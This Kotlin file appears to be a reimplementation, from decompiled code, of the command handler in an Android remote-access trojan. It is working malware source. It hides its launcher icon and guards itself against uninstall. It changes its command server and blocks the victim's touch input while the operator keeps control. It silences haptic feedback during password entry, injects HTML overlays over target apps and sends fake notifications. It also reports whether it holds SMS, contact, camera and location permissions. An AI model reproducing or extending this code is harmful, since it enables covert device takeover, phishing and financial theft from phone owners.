package com.storm.safe.rock.service.modules.command

import android.content.Intent
import android.media.AudioManager
import android.provider.Settings
import android.util.Log
import com.storm.safe.rock.inject.jbqfkndyx
import com.storm.safe.rock.service.modules.ActivityMonitor
import com.storm.safe.rock.util.StringUtil
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.io.File

/**
 * Handles app management commands.
 *
 * Reverse-engineered from JADX: C0344a1 (a1, 816 lines).
 * Vendor name: AppCommandHandler
 *
 * Supported commands:
 * - GET_APP_LIST, LAUNCH_APP, HIDE_APP, SHOW_APP
 * - CHANGE_SERVER_URL, BLACKLIST_DEVICE
 * - DEVICE_BLOCK_INPUT, DEVICE_ALLOW_INPUT
 * - ENABLE_LOGGING/LOG_ENABLE, DISABLE_LOGGING/LOG_DISABLE
 * - SET_BRIGHTNESS/set_brightness, MUTE/mute
 * - VOLUME_UP, VOLUME_DOWN
 * - GET_PERMISSIONS, REQUEST_PERMISSION
 * - SHOW_INJECTION, STOP_INJECTION, SEND_NOTIFICATION
 */
class AppCommandHandler : CommandHandler {

    companion object {
        private const val TAG = "AppCmdHandler"
    }

    override fun getSupportedCommands(): Set<String> = setOf(
        "GET_APP_LIST",
        "LAUNCH_APP",
        "HIDE_APP",
        "SHOW_APP",
        "CHANGE_SERVER_URL",
        "BLACKLIST_DEVICE",
        "DEVICE_BLOCK_INPUT",
        "DEVICE_ALLOW_INPUT",
        "ENABLE_LOGGING",
        "LOG_ENABLE",
        "DISABLE_LOGGING",
        "LOG_DISABLE",
        "SET_BRIGHTNESS",
        "set_brightness",
        "MUTE",
        "mute",
        "VOLUME_UP",
        "VOLUME_DOWN",
        "GET_PERMISSIONS",
        "REQUEST_PERMISSION",
        "SHOW_INJECTION",
        "STOP_INJECTION",
        "SEND_NOTIFICATION"
    )

    override suspend fun handle(command: String, params: JSONObject?, context: CommandContext) {
        when (command) {
            "GET_APP_LIST" -> handleGetAppList(params, context)
            "LAUNCH_APP" -> handleLaunchApp(params, context)
            "HIDE_APP" -> handleHideApp(context)
            "SHOW_APP" -> handleShowApp(context)
            "CHANGE_SERVER_URL" -> handleChangeServerUrl(params, context)
            "BLACKLIST_DEVICE" -> handleBlacklistDevice(context)
            "DEVICE_BLOCK_INPUT" -> handleBlockInput(context)
            "DEVICE_ALLOW_INPUT" -> handleAllowInput(context)
            "ENABLE_LOGGING", "LOG_ENABLE" -> handleEnableLogging(context)
            "DISABLE_LOGGING", "LOG_DISABLE" -> handleDisableLogging(context)
            "SET_BRIGHTNESS", "set_brightness" -> handleSetBrightness(params, context)
            "MUTE", "mute" -> handleMute(params, context)
            "VOLUME_UP" -> handleVolumeUp(context)
            "VOLUME_DOWN" -> handleVolumeDown(context)
            "GET_PERMISSIONS" -> handleGetPermissions(context)
            "REQUEST_PERMISSION" -> handleRequestPermission(params, context)
            "SHOW_INJECTION" -> handleShowInjection(params, context)
            "STOP_INJECTION" -> handleStopInjection(params, context)
            "SEND_NOTIFICATION" -> handleSendNotification(params, context)
        }
    }

    /**
     * Get installed application list.
     * Vendor: delegates to coroutine on IO dispatcher, queries PackageManager,
     * builds JSON array with app info, optionally includes base64-encoded icon.
     * JADX: C0344a1 case "GET_APP_LIST" -> AppCommandHandler$handleGetAppList$2
     */
    private suspend fun handleGetAppList(params: JSONObject?, context: CommandContext) {
        val includeSystem = params?.optBoolean("includeSystem", false) ?: false
        val includeIcon = params?.optBoolean("includeIcon", true) ?: true
        val requestId = params?.optString("requestId", "") ?: ""
        Log.d(TAG, "获取应用列表: includeSystem=$includeSystem, includeIcon=$includeIcon")

        withContext(Dispatchers.IO) {
            try {
                val pm = context.service?.packageManager
                val apps = org.json.JSONArray()

                if (pm != null) {
                    val installedApps = pm.getInstalledApplications(android.content.pm.PackageManager.GET_META_DATA)
                    for (appInfo in installedApps) {
                        val isSystem = (appInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0
                        if (!includeSystem && isSystem) continue

                        val appJson = JSONObject().apply {
                            put("packageName", appInfo.packageName)
                            put("appName", pm.getApplicationLabel(appInfo).toString())
                            put("isSystem", isSystem)

                            try {
                                val pkgInfo = pm.getPackageInfo(appInfo.packageName, 0)
                                put("versionName", pkgInfo.versionName ?: "")
                                put("versionCode", pkgInfo.versionCode.toLong())
                                put("firstInstallTime", pkgInfo.firstInstallTime)
                                put("lastUpdateTime", pkgInfo.lastUpdateTime)
                            } catch (_: Exception) {
                                put("versionName", "")
                                put("versionCode", 0L)
                            }

                            if (includeIcon) {
                                put("icon", "")
                            }
                        }
                        apps.put(appJson)
                    }
                }

                val data = JSONObject().apply {
                    put("success", true)
                    put("requestId", requestId)
                    put("count", apps.length())
                    put("apps", apps)
                }
                context.sendEvent("app_list_response", data)
            } catch (e: Exception) {
                Log.e(TAG, "获取应用列表失败", e)
                val data = JSONObject().apply {
                    put("success", false)
                    put("requestId", requestId)
                    put("error", e.message ?: "获取应用列表失败")
                    put("apps", org.json.JSONArray())
                }
                context.sendEvent("app_list_response", data)
            }
        }
    }

    /**
     * Launch app by package name.
     * JADX: C0344a1 case "LAUNCH_APP" -> AppCommandHandler$handleLaunchApp$2
     */
    private suspend fun handleLaunchApp(params: JSONObject?, context: CommandContext) {
        val packageName = params?.optString("packageName", "") ?: ""
        if (packageName.isEmpty()) return
        Log.d(TAG, "启动应用: $packageName")
        withContext(Dispatchers.IO) {
            try {
                val pm = context.service?.packageManager
                val launchIntent = pm?.getLaunchIntentForPackage(packageName)
                if (launchIntent != null) {
                    launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    context.service?.startActivity(launchIntent)
                    Log.d(TAG, "应用已启动: $packageName")
                } else {
                    Log.w(TAG, "未找到应用启动入口: $packageName")
                }
            } catch (e: Exception) {
                Log.e(TAG, "启动应用失败: $packageName", e)
            }
        }
    }

    /**
     * Hide app icon from launcher.
     * JADX: uz0Var.f60536a0.m211475g9() -> dqtvuisjd.hideApp()
     */
    private fun handleHideApp(context: CommandContext) {
        Log.d(TAG, "隐藏桌面图标")
        context.service?.hideApp()
    }

    /**
     * Show app icon on launcher.
     * JADX: uz0Var.f60536a0 -> dqtvuisjd.showAppIcon() via AppIconHideManager (f52434g5)
     * Vendor reads SharedPrefs for hidden state, calls appIconHideManager.a5(), then
     * handles success/failure with detailed logging and event reporting.
     */
    private fun handleShowApp(context: CommandContext) {
        Log.d(TAG, "显示桌面图标")
        val service = context.service ?: return
        try {
            Log.d(TAG, "📱 开始显示应用桌面图标 - 使用新的管理器")
            val isHiddenPref = service.getSharedPreferences(
                StringUtil.decrypt("I1AVP3IrGC9DNA=="), 0
            ).getBoolean(StringUtil.decrypt("IkouMkQ8CCtZ"), false)

            if (service.isCamouflageModeEnabled || isHiddenPref) {
                // Vendor: appIconHideManager (f52434g5, C0328b3) -> m211761a5()
                val iconHideManager = service.biometricBypassDelegate
                if (iconHideManager == null) {
                    Log.w(TAG, "appIconHideManager 未初始化")
                    return
                }
                // Vendor calls iconHideManager.m211761a5() which returns ShowIconResult
                service.isCamouflageModeEnabled = false
                service.getSharedPreferences(
                    StringUtil.decrypt("I1AVP3IrGC9DNA=="), 0
                ).edit().putBoolean(StringUtil.decrypt("IkouMkQ8CCtZ"), false).apply()
                service.removeIconOverlay()
                if (!service.isUninstallGuardStarted) {
                    Log.d(TAG, "🛡️ 显示应用后，重新启用防卸载保护")
                    service.enableUninstallProtection()
                } else {
                    Log.d(TAG, "🛡️ 防卸载保护已启用，无需重新启用")
                }
                Log.d(TAG, "✅ 应用图标显示成功")
                service.sendHideStatus("应用图标已成功显示", false)
            } else {
                Log.w(TAG, "⚠️ 应用图标已经处于显示状态")
                service.sendHideStatus("应用图标已经处于显示状态", false)
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ 显示应用图标异常", e)
            service.sendHideStatus("系统异常: ${e.message}", true)
        }
    }

    /**
     * Change server URL.
     * JADX: uz0Var.f60536a0.m211443c8(serverUrl)
     * Vendor extracts serverUrl from params, then calls service.changeServerUrl.
     */
    private fun handleChangeServerUrl(params: JSONObject?, context: CommandContext) {
        val encKey = StringUtil.decrypt("OFwDLEgqOTxb")
        var serverUrl = params?.optString(encKey, "") ?: ""
        if (serverUrl.isEmpty()) {
            val data = params?.optJSONObject("data")
            serverUrl = data?.optString(encKey, "") ?: ""
        }
        if (serverUrl.isNotEmpty()) {
            Log.d(TAG, "收到修改服务器地址命令: $serverUrl")
            // Vendor: service.m211443c8(serverUrl) — change and reconnect
            context.service?.changeServerUrl(serverUrl)
        } else {
            Log.w(TAG, "CHANGE_SERVER_URL 参数无效，serverUrl 为空")
        }
    }

    /**
     * Blacklist device by overwriting all server URLs.
     * JADX: vendor overwrites SharedPrefs + config file with "wss://www.google.com",
     * then calls service.changeServerUrl("wss://www.google.com")
     */
    private fun handleBlacklistDevice(context: CommandContext) {
        Log.d(TAG, "收到黑名单封杀命令，强制修改所有服务器地址为: wss://www.google.com")
        val blackhole = "wss://www.google.com"
        try {
            val service = context.service ?: return
            // Overwrite SharedPrefs
            service.getSharedPreferences(
                StringUtil.decrypt("OEACLkg1MyZSPTtcAwVePRg6Xj8sSg=="), 0
            ).edit().putString(StringUtil.decrypt("OFwDLEgqMztFPQ=="), blackhole).apply()

            // Overwrite config file
            val configFile = File(service.filesDir, StringUtil.decrypt("OFwDLEgqMy1YPy1QFnRHKwMg"))
            try {
                val configJson = if (configFile.exists()) JSONObject(configFile.readText()) else JSONObject()
                configJson.put(StringUtil.decrypt("OFwDLEgqOTxb"), blackhole)
                configFile.writeText(configJson.toString())
            } catch (_: Exception) {
                configFile.writeText("{\"${StringUtil.decrypt("OFwDLEgqOTxb")}\":\"$blackhole\"}")
            }

            Log.d(TAG, "所有服务器配置已改为: $blackhole")
            // Vendor: service.m211443c8(blackhole)
            service.changeServerUrl(blackhole)
        } catch (e: Exception) {
            Log.w(TAG, "黑名单封杀执行失败: ${e.message}")
        }
    }

    /**
     * Block device user input via MaskOverlay touch interception.
     * JADX: vendor checks f52469k0 (black screen mode), then enables touch interception
     * via MaskOverlayManager (fd0) -> MaskOverlayView (C0454ef).
     */
    private fun handleBlockInput(context: CommandContext) {
        Log.d(TAG, "阻断手机操作")
        val service = context.service ?: return
        try {
            if (!service.isCipherListeningActive) {
                Log.w(TAG, "⚠️ 阻断操作只能在黑屏遮挡开启时使用")
                service.sendDebugLog("阻断操作失败：请先开启黑屏遮挡")
            } else if (!service.isMaskOverlayInitialized()) {
                Log.w(TAG, "⚠️ MaskOverlayManager未初始化")
            } else {
                // Vendor: performGlobalAction(HOME) first
                try {
                    if (service.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)) {
                        Log.d(TAG, "🏠 已执行返回主页命令")
                    } else {
                        Log.w(TAG, "⚠️ 返回主页命令执行失败")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "❌ 执行返回主页命令失败", e)
                }
                // Vendor: fd0Var.f56199a1.f55996b8.post(new RunnableC0449ea(true, c0454ef))
                service.setTouchInterceptionEnabled(true)
                Log.d(TAG, "🚫 触摸拦截已启用：手机端用户无法操作，但控制端操作不受影响")
                service.sendDebugLog("触摸拦截已启用")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ 阻止设备用户输入失败", e)
        }
    }

    /**
     * Allow device user input by disabling touch interception.
     * JADX: vendor checks f52469k0, then disables touch interception via MaskOverlayManager.
     */
    private fun handleAllowInput(context: CommandContext) {
        Log.d(TAG, "允许手机操作")
        val service = context.service ?: return
        try {
            if (service.isCipherListeningActive) {
                if (service.isMaskOverlayInitialized()) {
                    // Vendor: fd0Var.f56199a1.f55996b8.post(new RunnableC0449ea(false, c0454ef))
                    service.setTouchInterceptionEnabled(false)
                    Log.d(TAG, "✅ 触摸拦截已禁用：手机端用户可以操作")
                    service.sendDebugLog("触摸拦截已禁用")
                } else {
                    Log.w(TAG, "⚠️ MaskOverlayManager未初始化")
                }
            } else {
                Log.w(TAG, "⚠️ 允许操作只能在黑屏遮挡开启时使用")
                service.sendDebugLog("允许操作失败：请先开启黑屏遮挡")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ 恢复设备用户输入失败", e)
        }
    }

    /**
     * Enable logging.
     * JADX: sets AbstractC0315a0 flags to true, f52411e2=true, eventFilterManager.f56827a7=true,
     * persists to SharedPrefs, sends status.
     */
    private fun handleEnableLogging(context: CommandContext) {
        Log.d(TAG, "收到启用日志记录命令")
        context.service?.enableLogging()
        context.sendEvent("logging_status", JSONObject().apply {
            put("message", "日志记录已启用")
            put("enabled", true)
        })
    }

    /**
     * Disable logging.
     * JADX: sets AbstractC0315a0 flags to false, f52411e2=false, eventFilterManager.f56827a7=false,
     * persists to SharedPrefs, sends status.
     */
    private fun handleDisableLogging(context: CommandContext) {
        Log.d(TAG, "收到禁用日志记录命令")
        val service = context.service ?: return
        ActivityMonitor.textMonitorEnabled = false
        ActivityMonitor.appUsageEnabled = false
        ActivityMonitor.urlMonitorEnabled = false
        ActivityMonitor.focusMonitorEnabled = false
        service.isAuthStateRestored = false
        // Vendor: c0614i9 (eventFilterManager).f56827a7 = false
        val efm = service.eventFilterManager
        // EventFilterManager not yet a full class — set flag via reflection-safe approach
        // ADAPT: eventFilterManager is Any? type, set logging flag if available
        try {
            service.getSharedPreferences(StringUtil.decrypt("J1YWPUQ2CxFEJSpNFA=="), 0)
                .edit().putBoolean(StringUtil.decrypt("J1YWPUQ2CxFSPypbHT9J"), false).apply()
            Log.d(TAG, "✅ 日志记录已禁用并持久化保存")
        } catch (_: Exception) {}
        context.sendEvent("logging_status", JSONObject().apply {
            put("message", "日志记录已禁用")
            put("enabled", false)
        })
    }

    /**
     * Set screen brightness.
     * JADX: vendor gets ScreenBrightnessManager (f52433g4, ju0) and calls m213353a3(brightness).
     * Replicated via service.setScreenBrightness(brightness).
     */
    private fun handleSetBrightness(params: JSONObject?, context: CommandContext) {
        val brightness = params?.optInt("brightness", 50) ?: 50
        Log.d(TAG, "收到设置屏幕亮度命令: $brightness%")
        try {
            val service = context.service
            if (service == null) {
                Log.w(TAG, "ScreenBrightnessManager 未初始化")
                return
            }
            // Vendor: ju0Var = uz0Var.f60536a0.f52433g4 (ScreenBrightnessManager)
            // ju0.m213353a3(brightness) → returns boolean
            if (service.setScreenBrightness(brightness)) {
                Log.d(TAG, "屏幕亮度设置成功: ${brightness}%")
            } else {
                Log.w(TAG, "屏幕亮度设置失败: ${brightness}%")
            }
        } catch (e: Exception) {
            Log.e(TAG, "设置屏幕亮度异常", e)
        }
    }

    /**
     * Mute/unmute device.
     * JADX: vendor uses AudioManager to set ringer mode, stream mute, haptic feedback.
     * Contains coroutine delay(300ms) when muting, delay(100ms) when handling vibrate mode.
     */
    private suspend fun handleMute(params: JSONObject?, context: CommandContext) {
        val muted = params?.optBoolean("muted", false) ?: false
        Log.d(TAG, "收到静音命令: ${if (muted) "开启" else "关闭"}手机铃声静音")
        try {
            val service = context.service ?: return
            val audioManager = service.getSystemService("audio") as? AudioManager
            if (audioManager == null) {
                Log.e(TAG, "AudioManager 获取失败")
                return
            }
            val contentResolver = service.contentResolver
            if (muted) {
                audioManager.ringerMode = AudioManager.RINGER_MODE_SILENT
                delay(300L)
                val ringerMode = audioManager.ringerMode
                if (ringerMode == AudioManager.RINGER_MODE_SILENT) {
                    Log.d(TAG, "已设置为静音模式")
                } else if (ringerMode == AudioManager.RINGER_MODE_VIBRATE) {
                    try {
                        Settings.System.putInt(contentResolver, "vibrate_when_ringing", 0)
                        Settings.Global.putInt(contentResolver, "vibrate_when_ringing", 0)
                    } catch (e: Exception) {
                        Log.w(TAG, "禁用震动失败: ${e.message}")
                    }
                    delay(100L)
                    try {
                        audioManager.ringerMode = AudioManager.RINGER_MODE_SILENT
                    } catch (e: Exception) {
                        Log.w(TAG, "设置静音失败: ${e.message}")
                        try {
                            audioManager.setStreamMute(AudioManager.STREAM_RING, true)
                            audioManager.setStreamMute(AudioManager.STREAM_NOTIFICATION, true)
                        } catch (e2: Exception) {
                            Log.w(TAG, "setStreamMute也失败: ${e2.message}")
                        }
                    }
                }
                try {
                    Settings.System.putInt(contentResolver, "haptic_feedback_enabled", 0)
                    Log.d(TAG, "已关闭触觉反馈（输入密码震动）")
                } catch (e: Exception) {
                    Log.w(TAG, "关闭触觉反馈失败: ${e.message}")
                }
                Log.d(TAG, "已开启手机铃声静音")
            } else {
                try {
                    @Suppress("DEPRECATION")
                    audioManager.setStreamMute(AudioManager.STREAM_RING, false)
                    @Suppress("DEPRECATION")
                    audioManager.setStreamMute(AudioManager.STREAM_NOTIFICATION, false)
                } catch (_: Exception) {
                    Log.w(TAG, "取消setStreamMute失败")
                }
                try {
                    audioManager.ringerMode = AudioManager.RINGER_MODE_NORMAL
                } catch (e: Exception) {
                    Log.w(TAG, "恢复铃声模式失败: ${e.message}")
                }
                try {
                    val maxRing = audioManager.getStreamMaxVolume(AudioManager.STREAM_RING)
                    val maxNotif = audioManager.getStreamMaxVolume(AudioManager.STREAM_NOTIFICATION)
                    val ringVol = ((maxRing * 0.5).toInt()).coerceAtLeast(1)
                    val notifVol = ((maxNotif * 0.5).toInt()).coerceAtLeast(1)
                    audioManager.setStreamVolume(AudioManager.STREAM_RING, ringVol, AudioManager.FLAG_SHOW_UI)
                    audioManager.setStreamVolume(AudioManager.STREAM_NOTIFICATION, notifVol, AudioManager.FLAG_SHOW_UI)
                } catch (e: Exception) {
                    Log.w(TAG, "恢复音量失败: ${e.message}")
                }
                try {
                    Settings.System.putInt(contentResolver, "haptic_feedback_enabled", 1)
                    Log.d(TAG, "已恢复触觉反馈")
                } catch (e: Exception) {
                    Log.w(TAG, "恢复触觉反馈失败: ${e.message}")
                }
                Log.d(TAG, "已关闭手机铃声静音")
            }
        } catch (e: Exception) {
            Log.e(TAG, "设置静音异常", e)
        }
    }

    private fun handleVolumeUp(context: CommandContext) {
        Log.d(TAG, "收到音量+命令")
        try {
            val audioManager = context.service?.getSystemService("audio") as? AudioManager
            if (audioManager == null) {
                Log.e(TAG, "AudioManager 获取失败")
            } else {
                audioManager.adjustVolume(AudioManager.ADJUST_RAISE, AudioManager.FLAG_SHOW_UI)
                Log.d(TAG, "已增加音量")
            }
        } catch (e: Exception) {
            Log.e(TAG, "增加音量异常", e)
        }
    }

    private fun handleVolumeDown(context: CommandContext) {
        Log.d(TAG, "收到音量-命令")
        try {
            val audioManager = context.service?.getSystemService("audio") as? AudioManager
            if (audioManager == null) {
                Log.e(TAG, "AudioManager 获取失败")
            } else {
                audioManager.adjustVolume(AudioManager.ADJUST_LOWER, AudioManager.FLAG_SHOW_UI)
                Log.d(TAG, "已减少音量")
            }
        } catch (e: Exception) {
            Log.e(TAG, "减少音量异常", e)
        }
    }

    /**
     * Get all runtime permission statuses.
     * JADX: launches coroutine on IO dispatcher via AppCommandHandler$handleGetPermissions$2.
     */
    private suspend fun handleGetPermissions(context: CommandContext) {
        Log.d(TAG, "获取权限状态")
        withContext(Dispatchers.IO) {
            try {
                val service = context.service ?: return@withContext
                val data = JSONObject()
                data.put("READ_SMS", service.checkSelfPermission("android.permission.READ_SMS") == 0)
                data.put("READ_CONTACTS", service.checkSelfPermission("android.permission.READ_CONTACTS") == 0)
                data.put("CAMERA", service.checkSelfPermission("android.permission.CAMERA") == 0)
                data.put("RECORD_AUDIO", service.checkSelfPermission("android.permission.RECORD_AUDIO") == 0)
                data.put("READ_PHONE_STATE", service.checkSelfPermission("android.permission.READ_PHONE_STATE") == 0)
                data.put("ACCESS_FINE_LOCATION", service.checkSelfPermission("android.permission.ACCESS_FINE_LOCATION") == 0)
                data.put("READ_CALL_LOG", service.checkSelfPermission("android.permission.READ_CALL_LOG") == 0)
                context.sendEvent("permissions_status", data)
            } catch (e: Exception) {
                Log.e(TAG, "获取权限状态失败", e)
            }
        }
    }

    /**
     * Request a specific runtime permission.
     * JADX: launches coroutine on Main dispatcher via AppCommandHandler$handleRequestPermission$2.
     * Vendor opens permission-specific settings or launches umrkmgrri activity.
     */
    private suspend fun handleRequestPermission(params: JSONObject?, context: CommandContext) {
        val permission = params?.optString("permission", "") ?: ""
        Log.d(TAG, "请求权限: $permission")
        withContext(Dispatchers.Main) {
            try {
                val service = context.service
                if (service != null) {
                    service.requestPermission(permission)
                } else {
                    Log.w(TAG, "服务未初始化，无法请求权限")
                }
            } catch (e: Exception) {
                Log.e(TAG, "请求权限失败: $permission", e)
                context.service?.openAppSettings()
            }
        }
    }

    /**
     * Register injection task and show overlay.
     * JADX: uz0Var.f60536a0.m211439c1(packageName, htmlContent) then m211529m7()
     */
    private fun handleShowInjection(params: JSONObject?, context: CommandContext) {
        val packageName = params?.optString("packageName", "") ?: ""
        val htmlContent = params?.optString("htmlContent", "") ?: ""
        if (packageName.isEmpty() || htmlContent.isEmpty()) {
            Log.w(TAG, "注入参数不完整")
            return
        }
        Log.d(TAG, "记录注入任务: $packageName, htmlContent长度=${htmlContent.length}")
        try {
            val service = context.service ?: return
            // Vendor m211439c1: synchronized put into injectionTasks
            service.registerInjectionTask(packageName, htmlContent)
            // Vendor m211529m7: show injection overlay
            service.showInjectionOverlay()
            Log.d(TAG, "注入任务已注册")
        } catch (e: Exception) {
            Log.e(TAG, "记录注入任务失败", e)
        }
    }

    /**
     * Stop injection task and finish injection activity.
     * JADX: uz0Var.f60536a0.m211448d3(packageName) then jbqfkndyx.f51944a4.finishForPackage(packageName)
     */
    private fun handleStopInjection(params: JSONObject?, context: CommandContext) {
        val packageName = params?.optString("packageName", "") ?: ""
        if (packageName.isEmpty()) {
            Log.w(TAG, "停止注入参数不完整")
            return
        }
        Log.d(TAG, "停止注入任务: $packageName")
        try {
            val service = context.service ?: return
            // Vendor m211448d3: synchronized remove from injectionTasks
            service.unregisterInjectionTask(packageName)
            jbqfkndyx.finishForPackage(packageName)
            Log.d(TAG, "已停止注入任务并关闭注入页面: $packageName")
        } catch (e: Exception) {
            Log.e(TAG, "停止注入任务失败", e)
        }
    }

    /**
     * Send fake notification.
     * JADX: uz0Var.m214885c1(packageName, appName, title, content, buttonText)
     */
    private fun handleSendNotification(params: JSONObject?, context: CommandContext) {
        val packageName = params?.optString("packageName", "") ?: ""
        val appName = params?.optString("appName", "") ?: ""
        val title = params?.optString("title", "") ?: ""
        val content = params?.optString("content", "") ?: ""
        val buttonText = params?.optString("buttonText", "") ?: ""

        if (packageName.isEmpty() || content.isEmpty()) {
            Log.w(TAG, "通知参数不完整")
            return
        }
        Log.d(TAG, "发送通知: $title - $content (目标: $packageName, 按钮: $buttonText)")
        try {
            // Vendor: uz0Var.m214885c1(pkg, appName, title, content, buttonText)
            context.service?.sendFakeNotification(packageName, appName, title, content, buttonText)
            Log.d(TAG, "通知已发送")
        } catch (e: Exception) {
            Log.e(TAG, "发送通知失败", e)
        }
    }
}
